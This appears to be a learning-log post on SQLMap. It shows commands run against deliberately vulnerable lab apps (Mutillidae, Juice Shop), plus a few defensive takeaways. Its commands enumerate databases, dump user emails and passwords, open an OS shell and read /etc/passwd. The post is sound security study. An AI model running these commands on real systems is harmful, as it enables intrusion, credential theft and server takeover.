## 🗓️ Day 29/100 – SQLMap: Automated SQL Injection Toolkit

**Focus:** Transition from manual SQLi to automated exploitation.

### ⚡ SQLMap Capabilities Demonstrated

**1. Target Discovery & Injection Detection**
```bash
sqlmap -u "http://localhost/mutillidae/index.php?page=user-info.php&username=admin" --batch

2. Database Enumeration# List all databases
sqlmap -u "target" --dbs

# List tables in specific database
sqlmap -u "target" -D juice_shop --tables

# List columns in specific table
sqlmap -u "target" -D juice_shop -T users --columns3. Data Exfiltration# Dump entire table
sqlmap -u "target" -D juice_shop -T users --dump

# Dump specific columns
sqlmap -u "target" -D juice_shop -T users -C "email,password" --dump4. Advanced Exploitation# OS command execution
sqlmap -u "target" --os-shell

# File system access
sqlmap -u "target" --file-read="/etc/passwd"🧠 Attack Speed ComparisonManual SQLi:    2-4 hours per vulnerable endpoint
SQLMap:         2-5 minutes per vulnerable endpoint🔒 Defensive TakeawaysParameterized Queries render SQLMap ineffectiveWAF Detection (signature-based) often bypassed by SQLMap's evasion techniquesDatabase Least Privilege limits damage even when exploited
